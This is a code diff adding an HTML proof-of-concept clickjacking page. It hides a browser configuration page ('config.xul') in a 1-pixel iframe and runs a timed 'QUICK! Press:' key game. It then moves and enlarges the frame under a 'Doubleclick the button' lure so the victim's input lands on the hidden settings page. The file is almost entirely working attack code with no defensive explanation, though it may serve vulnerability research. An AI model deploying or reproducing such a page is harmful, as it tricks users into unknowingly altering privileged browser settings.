@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Clickjacking Attack</title>
+        <style>
+        * {
+            border: 0;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: sans-serif;
+        }
+        main {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .instructions {
+            text-align: center;
+            font-size: 40px;
+            padding-top: calc(50vh - 20px - 140px);
+        }
+        .finish {
+            padding-top: calc(50vh - 20px - 140px);
+            font-size: 20px;
+            text-align: center;
+            position: relative;
+            top: 80px;
+            z-index: 20;
+        }
+        .char {
+            font-size: 300px;
+            line-height: 250px;
+            text-align: center;
+        }
+        .container,
+        .container-top {
+            position: absolute;
+            left: 0;
+            top: 0;
+        }
+        .container-top,
+        .container-bottom {
+            width: 100%;
+            background: #fff;
+        }
+        .container-top {
+            height: 71px;
+        }
+        .container-bottom {
+            position: absolute;
+            left: 0;
+            bottom: 0;
+            height: 21px;
+        }
+        .container-right {
+            position: absolute;
+            top: 72px;
+            right: 0;
+            width: 1px;
+            height: calc(120px - 70px - 20px);
+            background: #aaa;
+        }
+        iframe {
+            width: 1px;
+            height: 1px;
+        }
+        </style>
+    </head>
+    <body>
+        <main>
+            <div class="instructions">QUICK! Press:</div>
+            <div class="char"></div>
+        </main>
+        <div class="container">
+            <div class="container-top"></div>
+            <div class="container-bottom"></div>
+            <div class="container-right"></div>
+        </div>
+    </body>
+<script>
+/* Okay, I admit I suck at creating a realistic attack scenario :-/ */
+const charNode = document.querySelector('.char');
+const contNode = document.querySelector('.container');
+const mainNode = document.querySelector('main');
+
+const iframeNode = document.createElement('iframe');
+iframeNode.src = '../content/config.xul';
+contNode.appendChild(iframeNode);
+
+
+function showChar(char) {
+    charNode.textContent = char;
+}
+
+
+function finish() {
+    mainNode.innerHTML = '<div class="finish">Finished.<br>' +
+                         'Doubleclick the button<br>to see your result:</div>';
+    contNode.style.left = 'calc(50vw - 25px)';
+    contNode.style.top = 'calc(50vh - 60px)';
+    iframeNode.style.width = '50px';
+    iframeNode.style.height = '120px';
+}
+
+
+function next() {
+    if (!chars.length) {
+        finish();
+        return;
+    }
+    var char_ = chars.shift();
+    showChar(char_[0]);
+    setTimeout(next, char_[1]);
+}
+
+
+var chars = [
+    ['r', 2000],
+    ['e', 1000],
+    ['s', 800],
+    ['.', 1500],
+    ['r', 1000],
+];
+next();
+</script>
+</html>
